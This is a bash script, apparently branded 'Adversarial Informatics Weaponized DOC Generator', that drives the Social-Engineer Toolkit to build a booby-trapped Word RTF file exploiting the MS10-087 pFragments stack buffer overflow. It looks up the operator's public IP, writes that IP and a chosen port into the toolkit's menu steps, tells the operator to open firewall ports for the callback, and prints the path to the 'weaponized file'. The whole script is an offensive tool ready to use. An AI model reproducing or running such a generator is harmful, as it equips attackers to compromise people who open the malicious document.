 #!/bin/bash

RED='\033[1;31m'
BLUE='\033[1;34m'
GREEN='\033[1;32m'
YELLOW='\033[49;93m'
NC='\033[0m' # No Color

echo -e "${YELLOW}"
echo -e "+----------------------------------------------------+"
echo -e "|  Adversarial Informatics Weaponized DOC Generator  |"
echo -e "|               cygienesolutions.com                 |"
echo -e "|   [Usage]: ./doc_aic_gen.sh <port> <filename>      |"
echo -e "+----------------------------------------------------+"
echo -e "${NC}"
if [ $# == 0 ] ; then
    echo "[!] Don't forget to punch a hole in your FW (80,443) and PRTFWD to the local machine."
    echo -e "${GREEN}"
    echo "[Usage]: ./doc_aic_gen.sh <port> <filename>"
    echo -e "${NC}"
    echo ""
    exit 1; fi

echo -e "${GREEN}"
echo -e "Retrieving public IP address..."
PUB=$(curl -s "http://myexternalip.com/raw")
echo "Public IP: $PUB"
echo -e "${NC}"

TS=$(date +%y%d%h%m%S) 
PORT=$1
FILENAME=$2

#Generating Microsoft Word RTF pFragments Stack Buffer Overflow (MS10-087)
#FileType: doc
echo "1" > set_steps.rsc
echo "1" >> set_steps.rsc
echo "2" >> set_steps.rsc
echo "6" >> set_steps.rsc
echo "1" >> set_steps.rsc
echo $PUB >> set_steps.rsc
echo $PORT >> set_steps.rsc
echo "2" >> set_steps.rsc
echo $FILENAME >> set_steps.rsc
echo "99" >> set_steps.rsc

echo "Executing steps to generate Word RTF pFragments Stack Buffer Overflow (MS10-087) doc file..."
/opt/social-engineer-toolkit/seautomate /opt/EnumScripts/set_steps.rsc
echo -e "${GREEN}"
echo "Done."
echo -e "${NC}"


echo -e "${YELLOW}"
echo "{Ӧ} Support Free Information {Ӧ}"
echo -e "${NC}"

echo "Copying generated file to local directory..."

echo -e "${GREEN}"
PATHTOFILE=$(readlink -f /root/.set/$FILENAME)
echo "Public IP Configured: $PUB"
echo "Port Configured: $PORT"
echo "Path to weaponized file: $PATHTOFILE"
echo -e "${NC}"

